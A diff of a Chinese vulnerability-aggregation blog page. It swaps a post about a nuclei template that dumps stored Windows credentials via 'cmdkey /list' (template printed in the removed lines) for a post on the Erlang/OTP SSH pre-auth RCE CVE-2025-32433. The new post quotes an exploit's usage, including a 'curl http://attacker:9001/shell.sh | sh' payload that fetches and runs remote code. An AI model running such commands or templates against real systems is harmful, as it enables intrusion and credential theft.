@@ -19,23 +19,23 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： Windows Get Stored Credentials - cmdkey Vulnerability 漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： Windows中的cmdkey &#x2F;list命令用于列出系统上存储的所有凭据。这些凭据可能包括为网络资源、网站或远程计算机保存的用户名和密码，存在信息泄露的风险。 产品厂商： Microsoft 产品名称： Wi">
+    <meta name="description" content="漏洞信息漏洞名称： Erlang&#x2F;OTP SSH 预认证远程代码执行漏洞 漏洞编号：  CVE： CVE-2025-32433  漏洞类型： 命令执行 漏洞等级： 高危 漏洞描述： Erlang&#x2F;OTP是一套为Erlang编程语言提供的库。在OTP-27.3.3、OTP-26.2.5.11和OTP-25.3.2.20之前的版本中，SSH服务器可能允许攻击者执行未经认证的远程代码">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Windows Get Stored Credentials - cmdkey Vulnerability">
-<meta property="og:url" content="http://example.com/2025/06/12/github_281223188/index.html">
+<meta property="og:title" content="Erlang&#x2F;OTP SSH 预认证远程代码执行漏洞">
+<meta property="og:url" content="http://example.com/2025/06/15/github_3834803000/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： Windows Get Stored Credentials - cmdkey Vulnerability 漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： Windows中的cmdkey &#x2F;list命令用于列出系统上存储的所有凭据。这些凭据可能包括为网络资源、网站或远程计算机保存的用户名和密码，存在信息泄露的风险。 产品厂商： Microsoft 产品名称： Wi">
+<meta property="og:description" content="漏洞信息漏洞名称： Erlang&#x2F;OTP SSH 预认证远程代码执行漏洞 漏洞编号：  CVE： CVE-2025-32433  漏洞类型： 命令执行 漏洞等级： 高危 漏洞描述： Erlang&#x2F;OTP是一套为Erlang编程语言提供的库。在OTP-27.3.3、OTP-26.2.5.11和OTP-25.3.2.20之前的版本中，SSH服务器可能允许攻击者执行未经认证的远程代码">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-12T10:45:23.433Z">
-<meta property="article:modified_time" content="2025-06-12T10:45:23.428Z">
+<meta property="article:published_time" content="2025-06-15T13:15:32.015Z">
+<meta property="article:modified_time" content="2025-06-15T13:15:32.014Z">
 <meta property="article:author" content="lianccc">
-<meta property="article:tag" content="信息泄露">
-<meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="CVE-2025:github search">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Windows Get Stored Credentials - cmdkey Vulnerability - liancc&#39; infos blog</title>
+  <title>Erlang/OTP SSH 预认证远程代码执行漏洞 - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Windows Get Stored Credentials - cmdkey Vulnerability"></span>
+            <span id="subtitle" data-typed-text="Erlang/OTP SSH 预认证远程代码执行漏洞"></span>
           
         </div>
 
@@ -213,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-12 10:45" pubdate>
-          2025年6月12日 上午
+        <time datetime="2025-06-15 13:15" pubdate>
+          2025年6月15日 下午
         </time>
       </span>
     
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          161 字
+          305 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          2 分钟
+          3 分钟
         
       </span>
     
@@ -273,21 +273,88 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Windows Get Stored Credentials - cmdkey Vulnerability</h1>
+            <h1 id="seo-header">Erlang/OTP SSH 预认证远程代码执行漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Windows Get Stored Credentials - cmdkey Vulnerability</p>
-<p><strong>漏洞类型：</strong> 信息泄露</p>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Erlang&#x2F;OTP SSH 预认证远程代码执行漏洞</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2025-32433</li>
+</ul>
+<p><strong>漏洞类型：</strong> 命令执行</p>
 <p><strong>漏洞等级：</strong> 高危</p>
-<p><strong>漏洞描述：</strong> Windows中的cmdkey &#x2F;list命令用于列出系统上存储的所有凭据。这些凭据可能包括为网络资源、网站或远程计算机保存的用户名和密码，存在信息泄露的风险。</p>
-<p><strong>产品厂商：</strong> Microsoft</p>
-<p><strong>产品名称：</strong> Windows</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/697e27d60d3da75fc80782a72b85416fbd5f641d/code%2Fwindows%2Fget-stored-credentials-cmdkey.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/697e27d60d3da75fc80782a72b85416fbd5f641d/code%2Fwindows%2Fget-stored-credentials-cmdkey.yaml</a></p>
-<p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
-<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">get-stored-credentials-cmdkey</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Get Stored Credentials - cmdkey</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pussycat0x</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">The cmdkey /list command in Windows is used to list all the stored credentials on the system. These credentials can include saved usernames and passwords for network resources, websites, or remote computers</span><br><span class="hljs-attribute">  tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">code,windows,privesc,ps,enum</span><br><br><span class="hljs-attribute">self-contained</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><span class="hljs-attribute">code</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">engine:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">powershell</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">powershell.exe</span><br>    <span class="hljs-attribute">args</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">-ExecutionPolicy</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">Bypass</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">-File</span><br>    <span class="hljs-attribute">pattern</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br>    <span class="hljs-attribute">source</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>      <span class="hljs-attribute">cmdkey /list</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">    extractors</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: dsl</span><br>        <span class="hljs-attribute">dsl</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">response</span><br><br><br></code></pre></td></tr></table></figure>
-
+<p><strong>漏洞描述：</strong> Erlang&#x2F;OTP是一套为Erlang编程语言提供的库。在OTP-27.3.3、OTP-26.2.5.11和OTP-25.3.2.20之前的版本中，SSH服务器可能允许攻击者执行未经认证的远程代码执行（RCE）。通过利用SSH协议消息处理中的缺陷，攻击者可以在未认证的情况下执行远程代码。</p>
+<p><strong>产品厂商：</strong> Erlang</p>
+<p><strong>产品名称：</strong> Erlang&#x2F;OTP</p>
+<p><strong>影响版本：</strong> version &lt; OTP-27.3.3, version &lt; OTP-26.2.5.11, version &lt; OTP-25.3.2.20</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/Yuri08loveElaina/CVE-2025-32433-Erlang-OTP-SSH-Pre-Auth-RCE-exploit">https://github.com/Yuri08loveElaina/CVE-2025-32433-Erlang-OTP-SSH-Pre-Auth-RCE-exploit</a></p>
+<p><strong>类型：</strong> CVE-2025:github search</p>
+<h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul>
+<li>README.md</li>
+<li>elaina_cve2025_32433.py</li>
+</ul>
+<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="VIETNAMESE"><a href="#VIETNAMESE" class="headerlink" title="VIETNAMESE"></a>VIETNAMESE</h3><ul>
+<li><h2 id="Cach-su-dung"><a href="#Cach-su-dung" class="headerlink" title="Cách sử dụng"></a>Cách sử dụng</h2></li>
+<li><p>Quét một IP:</p>
+</li>
+</ul>
+<blockquote>
+<p>python3 elaina_cve2025_32433.py –target 192.168.1.10</p>
+</blockquote>
+<ul>
+<li><p>Quét nhiều IP từ file:</p>
+<blockquote>
+<p>python3 elaina_cve2025_32433.py –file targets.txt</p>
+</blockquote>
+</li>
+<li><p>Khai thác nếu phát hiện lỗ hổng:</p>
+</li>
+</ul>
+<blockquote>
+<p>python3 elaina_cve2025_32433.py –target 192.168.1.10 –exploit</p>
+</blockquote>
+<ul>
+<li>Tùy chọn payload:</li>
+</ul>
+<blockquote>
+<p>python3 elaina_cve2025_32433.py –target 192.168.1.10 –exploit –payload “curl <a target="_blank" rel="noopener" href="http://attacker:9001/shell.sh">http://attacker:9001/shell.sh</a> | sh”</p>
+</blockquote>
+<ul>
+<li>Xuất ra JSON:</li>
+</ul>
+<blockquote>
+<p>python3 elaina_cve2025_32433.py –file targets.txt –json-output scan_result.json</p>
+</blockquote>
+<h3 id="ENGLISH"><a href="#ENGLISH" class="headerlink" title="ENGLISH"></a>ENGLISH</h3><ul>
+<li><h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2></li>
+<li><p>Scan single IP:<br>python3 elaina_cve2025_32433.py –target 192.168.1.10</p>
+</li>
+<li><p>Scan multiple IPs from file:</p>
+</li>
+</ul>
+<blockquote>
+<p>python3 elaina_cve2025_32433.py –file targets.txt</p>
+</blockquote>
+<ul>
+<li>Exploit if vulnerability is found:</li>
+</ul>
+<blockquote>
+<p>python3 elaina_cve2025_32433.py –target 192.168.1.10 –exploit</p>
+</blockquote>
+<ul>
+<li>Payload options:</li>
+</ul>
+<blockquote>
+<p>python3 elaina_cve2025_32433.py –target 192.168.1.10 –exploit –payload “curl <a target="_blank" rel="noopener" href="http://attacker:9001/shell.sh">http://attacker:9001/shell.sh</a> | sh”</p>
+</blockquote>
+<ul>
+<li>Output to JSON:</li>
+</ul>
+<blockquote>
+<p>python3 elaina_cve2025_32433.py –file targets.txt –json-output scan_result.json</p>
+</blockquote>
 
                 
               </div>
@@ -321,9 +388,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="print-no-link">#信息泄露</a>
+        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="print-no-link">#命令执行</a>
       
-        <a href="/tags/projectdiscovery-nuclei-templates-github-issues/" class="print-no-link">#projectdiscovery/nuclei-templates:github issues</a>
+        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
       
     </div>
   
@@ -335,8 +402,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Windows Get Stored Credentials - cmdkey Vulnerability</div>
-      <div>http://example.com/2025/06/12/github_281223188/</div>
+      <div>Erlang/OTP SSH 预认证远程代码执行漏洞</div>
+      <div>http://example.com/2025/06/15/github_3834803000/</div>
     </div>
     <div class="license-meta">
       
@@ -348,7 +415,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年6月12日</div>
+          <div>2025年6月15日</div>
         </div>
       
       
@@ -380,18 +447,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/12/github_1592714442/" title="DataEase JWT签名验证绕过漏洞">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">DataEase JWT签名验证绕过漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/12/github_1329821886/" title="CVE-2025-32711 Exploit">
-                        <span class="hidden-mobile">CVE-2025-32711 Exploit</span>
+                      <a href="/2025/06/15/github_3966977596/" title="APSystems ECU-R Firmware 远程代码执行漏洞">
+                        <span class="hidden-mobile">APSystems ECU-R Firmware 远程代码执行漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
